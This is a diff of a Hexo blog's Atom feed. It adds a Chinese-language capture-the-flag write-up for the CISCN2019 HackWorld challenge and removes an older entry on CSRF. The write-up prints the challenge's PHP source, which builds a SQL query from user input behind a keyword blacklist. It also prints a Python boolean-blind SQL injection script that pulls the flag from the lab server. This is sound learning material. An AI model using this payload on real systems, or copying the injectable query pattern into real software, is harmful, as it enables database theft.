@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-18T14:40:13.072Z</updated>
+  <updated>2020-06-19T02:39:19.674Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CISCN2019华北赛区Day2-HackWorld</title>
+    <link href="http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/"/>
+    <id>http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/</id>
+    <published>2020-06-19T02:23:07.000Z</published>
+    <updated>2020-06-19T02:39:19.674Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/1.png" alt="1"></p><p>结合提示，是个sql注入类型的题目，尝试注入测试</p><p>输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend.  输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result.</p><p>能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧</p><pre><code class="php">&lt;?php$dbuser=&#39;root&#39;;$dbpass=&#39;root&#39;;function safe($sql){    #被过滤的内容 函数基本没过滤    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);    foreach($blackList as $blackitem){        if(stripos($sql,$blackitem)){            return False;        }    }    return True;}if(isset($_POST[&#39;id&#39;])){    $id = $_POST[&#39;id&#39;];}else{    die();}$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db){    die(mysql_error());}   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id)){    $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;);    if($query){        $result = mysql_fetch_array($query);        if($result){            echo $result[&#39;content&#39;];        }else{            echo &quot;Error Occured When Fetch Result.&quot;;        }    }else{        var_dump($query);    }}else{    die(&quot;SQL Injection Checked.&quot;);}</code></pre><p>可以看到过滤了空格等很多东西，但是也有很多东西没过滤</p><p>因为我能力有限，还是研究师傅们的代码吧</p><pre><code class="python">import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload={    &quot;id&quot; : &quot;&quot;}for i in range(0,60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))        s = requests.post(url,data=payload)        #print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><p>但是这个代码我运行的时候报错，所以删掉了<code>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)</code></p><p>能够正常运行，得到flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>强网杯2019-高明的黑客</title>
@@ -429,27 +452,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;文件上传绕过&quot;&gt;&lt;a href=&quot;#文件上传绕过&quot; class=&quot;headerlink&quot; title=&quot;文件上传绕过&quot;&gt;&lt;/a&gt;文件上传绕过&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day8</title>
-    <link href="http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/"/>
-    <id>http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/</id>
-    <published>2020-03-24T14:14:53.000Z</published>
-    <updated>2020-03-24T14:41:56.479Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><a id="more"></a><p>CSRF ( Cross-site request forgery )跨站请求伪造,也有人写出XSRF。黑客伪造用户的HTTP请求。然后将这个HTTP请求发送给存在CSRF的网站,有CSRF的网站执行了伪造的HTTP请求,就引发了跨站请求伪造</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;CSRF漏洞&quot;&gt;&lt;a href=&quot;#CSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞&quot;&gt;&lt;/a&gt;CSRF漏洞&lt;/h2&gt;
     
     </summary>
     
